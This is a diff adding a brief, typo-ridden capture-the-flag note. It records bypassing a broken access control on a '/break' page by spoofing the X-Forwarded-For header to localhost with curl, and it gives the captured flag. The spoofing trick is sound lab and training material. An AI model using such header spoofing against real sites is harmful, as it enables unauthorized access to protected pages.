@@ -1,0 +1,13 @@
+open home page its a broken access control
+
+open the /break page
+
+its redirect by home page 
+
+lets try broken broken access control methods 
+
+x-forwarded-for:127.0.0.1
+
+its work lets try curl -H "X-Forwarded-For: 127.0.01" https://localhot/break
+
+flag is spooted: WBCOECTF{B46K0n_A34n_A4c8s_C00nt6l}
